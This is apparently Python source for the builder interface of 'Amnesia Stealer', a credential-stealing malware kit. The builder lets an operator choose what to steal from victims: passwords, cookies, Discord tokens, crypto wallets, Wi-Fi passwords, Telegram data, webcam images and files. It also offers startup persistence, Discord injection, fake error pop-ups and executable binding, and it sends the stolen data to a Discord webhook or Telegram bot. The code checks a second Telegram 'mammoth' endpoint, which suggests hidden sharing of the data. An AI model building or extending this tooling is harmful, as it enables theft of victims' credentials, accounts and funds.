...
class Utility:
	...
	def CheckForUpdates() -> bool:
		if Settings.UpdatesCheck:
			...
			hashFilePath = os.path.join(os.path.dirname(__file__), "Custom", "hash")
			if os.path.isfile(hashFilePath):
				...
				try:
					...
					newhash = json.loads(http.request("GET", "https://amnesiavxcz.com", timeout= 5).data.decode())["hash"]
...
exe_path = "variables/Scripts/dist/hacn.exe"
...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def __init__(self, master) -> None:
		...
		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text="Enter Webhook Here", height=38, font=self.font, text_color="purple")
		self.C2EntryControl.grid(row=0, column=0, sticky="ew", padx=(15, 5), columnspan=5)

		self.testC2ButtonControl = ctk.CTkButton(self, text="Test Webhook", height=38, font=self.font, fg_color="#00008B", hover_color="#800080", text_color_disabled="#D8BFD8", command=lambda: Thread(target=self.testC2ButtonControl_Callback).start())
		self.testC2ButtonControl.grid(row=0, column=5, sticky="ew", padx=(5, 15))

		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text="Ping Me", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.pingMeVar)
		self.pingMeCheckboxControl.grid(row=1, column=0, sticky="w", padx=20)

		self.startupCheckboxControl = ctk.CTkCheckBox(self, text="Put On Startup", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.startupVar)
		self.startupCheckboxControl.grid(row=3, column=0, sticky="w", padx=20)

		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text="Pump Stub", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", command=self.pumpStub_Event, variable=self.pumpStubVar)
		self.pumpStubCheckboxControl.grid(row=5, column=0, sticky="w", padx=20)

		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text="Webcam", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureWebcamVar)
		self.captureWebcamCheckboxControl.grid(row=1, column=1, sticky="w", padx=20)

		self.capturePasswordsCheckboxControl = ctk.CTkCheckBox(self, text="Passwords", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.capturePasswordsVar)
		self.capturePasswordsCheckboxControl.grid(row=2, column=1, sticky="w", padx=20)

		self.captureCookiesCheckboxControl = ctk.CTkCheckBox(self, text="Cookies", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureCookiesVar)
		self.captureCookiesCheckboxControl.grid(row=3, column=1, sticky="w", padx=20)

		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text="History", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureHistoryVar)
		self.captureHistoryCheckboxControl.grid(row=4, column=1, sticky="w", padx=20)

		self.captureAutofillsCheckboxControl = ctk.CTkCheckBox(self, text="Autofills", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureAutofillsVar)
		self.captureAutofillsCheckboxControl.grid(row=5, column=1, sticky="w", padx=20)

		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text="Discord Tokens", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureDiscordTokensVar)
		self.captureDiscordTokensCheckboxControl.grid(row=1, column=2, sticky="w", padx=20)

		self.captureGamesCheckboxControl = ctk.CTkCheckBox(self, text="Games", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureGamesVar)
		self.captureGamesCheckboxControl.grid(row=2, column=2, sticky="w", padx=20)

		self.captureWalletsCheckboxControl = ctk.CTkCheckBox(self, text="Wallets", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureWalletsVar)
		self.captureWalletsCheckboxControl.grid(row=3, column=2, sticky="w", padx=20)

		self.captureWifiPasswordsCheckboxControl = ctk.CTkCheckBox(self, text="Wifi Passwords", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureWifiPasswordsVar)
		self.captureWifiPasswordsCheckboxControl.grid(row=4, column=2, sticky="w", padx=20)

		self.captureSysteminfoCheckboxControl = ctk.CTkCheckBox(self, text="System Info", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureSystemInfoVar)
		self.captureSysteminfoCheckboxControl.grid(row=1, column=3, sticky="w", padx=20)

		self.captureScreenshotCheckboxControl = ctk.CTkCheckBox(self, text="Screenshot", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureScreenshotVar)
		self.captureScreenshotCheckboxControl.grid(row=2, column=3, sticky="w", padx=20)

		self.captureTelegramChecboxControl = ctk.CTkCheckBox(self, text="Telegram", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureTelegramVar)
		self.captureTelegramChecboxControl.grid(row=3, column=3, sticky="w", padx=20)

		self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(self, text="Common Files", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.captureCommonFilesVar)
		self.captureCommonFilesChecboxControl.grid(row=4, column=3, sticky="w", padx=20)

		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text="Fake Error", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", command=self.fakeError_Event, variable=self.fakeErrorVar)
		self.fakeErrorCheckboxControl.grid(row=1, column=4, sticky="w", padx=20)

		self.discordInjectionCheckboxControl = ctk.CTkCheckBox(self, text="Discord Injection", font=self.font, height=38, hover_color="#800080", text_color="#D8BFD8", text_color_disabled="#D8BFD8", variable=self.discordInjectionVar)
		self.discordInjectionCheckboxControl.grid(row=3, column=4, sticky="w", padx=20)

		self.C2ModeButtonControl = ctk.CTkButton(self, text="C2: Discord", height=38, font=self.font, fg_color="#00008B", hover_color="#800080", text_color_disabled="#D8BFD8", command=self.C2ModeButtonControl_Callback)
		self.C2ModeButtonControl.grid(row=1, column=5, sticky="ew", padx=(0, 15))

		self.bindExeButtonControl = ctk.CTkButton(self, text="Bind Executable", height=38, font=self.font, fg_color="#00008B", hover_color="#800080", text_color_disabled="#D8BFD8", command=self.bindExeButtonControl_Callback)
		self.bindExeButtonControl.grid(row=2, column=5, sticky="ew", padx=(0, 15))

		self.buildModeButtonControl = ctk.CTkButton(self, text="Output: EXE File", height=38, font=self.font, fg_color="#00008B", hover_color="#800080", text_color_disabled="#D8BFD8", command=self.buildModeButtonControl_Callback)
		self.buildModeButtonControl.grid(row=4, column=5, sticky="ew", padx=(0, 15))

		self.consoleModeButtonControl = ctk.CTkButton(self, text="Console: None", height=38, font=self.font, fg_color="#00008B", hover_color="#800080", text_color_disabled="#D8BFD8", command=self.consoleModeButtonControl_Callback)
		self.consoleModeButtonControl.grid(row=5, column=5, sticky="ew", padx=(0, 15))

		self.buildButtonControl = ctk.CTkButton(self, text="Build", height=38, font=self.font, fg_color="#00008B", hover_color="#800080", text_color_disabled="#D8BFD8", command=self.buildButtonControl_Callback)
		...
		def check():
			...
			if self.C2Mode == 0:
				...
				if not webhook.startswith(("http://", "https://")):
					...
					messagebox.showwarning("Warning", "Its not a discord Webhook!")
					return
				...
				try:
					data = json.dumps({"content" : "[Amnesia] webhook is working!"}).encode()
					...
					status = http.status
					if status == 204:
						messagebox.showinfo("Success", "[Amnesia] Webhook is working]!")
					else:
						messagebox.showwarning("Warning", "[Amnesia] Webhook is not working!")
				except Exception:
				...
				if token:
					try:
						...
						resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getUpdates" % token1).data.decode())                
						if not resp["ok"]:
				...
				if chat_id:
					if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
						...
						try:
							...
							resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token1, chat_id1)).data.decode())                            
							if not resp["ok"]:
				...
				try:
					http = PoolManager(cert_reqs="CERT_NONE")
					if http.request("GET", "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("[Amnesia] webpoint is working!"))).status == 200 and http.request("GET", "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token1, chat_id1, quote("Your mammoth endpoint is also working!"))).status == 200:

						messagebox.showinfo("Success", "[Amnesia] webpoint is working!")
						return
				except Exception as e:
					print(e)
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Amnesia Stealer [File Pumper]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Custom", "icon.ico")))
		self.grab_set()
		...
		self.okButton = ctk.CTkButton(self, text= "OK", font= self.font, fg_color= "green", hover_color= "#FF8000", text_color_disabled= "white", command= self.ok_Event)
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Amnesia Stealer [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Custom", "icon.ico")))
		self.grab_set()
		...
		self.titleEntry = ctk.CTkEntry(self, placeholder_text="Enter title here", height=35, font=self.font, text_color="purple")
		self.titleEntry.grid(row=0, column=1, padx=20, sticky="ew", columnspan=2)

		self.messageEntry = ctk.CTkEntry(self, placeholder_text="Enter message here", height=35, font=self.font, text_color="purple")
		self.messageEntry.grid(row=1, column=1, padx=20, sticky="ew", columnspan=2)

		self.iconChoiceSt = ctk.CTkRadioButton(self, text="Stop", value=0, variable=self.iconVar, font=self.font, text_color="#D8BFD8", hover_color="#800080")
		self.iconChoiceSt.grid(row=4, column=1, sticky="w", padx=20)

		self.iconChoiceQn = ctk.CTkRadioButton(self, text="Question", value=16, variable=self.iconVar, font=self.font, text_color="#D8BFD8", hover_color="#800080")
		self.iconChoiceQn.grid(row=5, column=1, sticky="w", padx=20)

		self.iconChoiceWa = ctk.CTkRadioButton(self, text="Warning", value=32, variable=self.iconVar, font=self.font, text_color="#D8BFD8", hover_color="#800080")
		self.iconChoiceWa.grid(row=6, column=1, sticky="w", padx=20)

		self.iconChoiceIn = ctk.CTkRadioButton(self, text="Information", value=48, variable=self.iconVar, font=self.font, text_color="#D8BFD8", hover_color="#800080")
		self.iconChoiceIn.grid(row=7, column=1, sticky="w", padx=20)

		self.testButton = ctk.CTkButton(self, text="Test", height=28, font=self.font, fg_color="#00008B", hover_color="#800080", command=self.testFakeError)
		self.testButton.grid(row=4, column=2, padx=20)

		self.saveButton = ctk.CTkButton(self, text="Save", height=28, font=self.font, fg_color="#00008B", hover_color="#800080", command=self.saveFakeError)
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Amnesia Builder")
		self.iconbitmap(os.path.join("Custom", "icon.ico"))
	...
	def BuildPythonFile(self, config: str) -> None:
		...
		with open(os.path.join(os.path.dirname(__file__), "Amnesiadb", "stub.py")) as file:
			code = file.read()
		
		sys.path.append(os.path.join(os.path.dirname(__file__), "Amnesiadb")) # Adds Amnesiadb to PATH

		if os.path.isdir(os.path.join(os.path.dirname(__file__), "Amnesiadb", "__pycache__")):
			try:
				shutil.rmtree(os.path.join(os.path.dirname(__file__), "Amnesiadb", "__pycache__"))
			except Exception:
				pass
		from Amnesiadb import process
	...
	def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
		...
		if not os.path.isfile(os.path.join("variables", "Scripts", "run.bat")):
			if not os.path.isfile(os.path.join("variables", "Scripts", "activate")):
				print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
				res = subprocess.run("python -m venv variables", capture_output= True, shell= True)
				clear()
				if res.returncode != 0:
					print('Error while creating virtual environment ("python -m venv variables"): {}'.format(res.stderr.decode(errors= "ignore")))
					Exit(1)

		print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
		for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Amnesiadb")):
			if os.path.isfile(fileloc := os.path.join(datadir, i)):
				shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "variables", "Scripts", i))
			else:
				shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "variables", "Scripts", i))

		with open(os.path.join(os.path.dirname(__file__), "variables", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
			file.write(config)

		clear()

		os.chdir(os.path.join(os.path.dirname(__file__), "variables", "Scripts"))
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Amnesiadb")):
			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Amnesiadb folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
			exit(1)
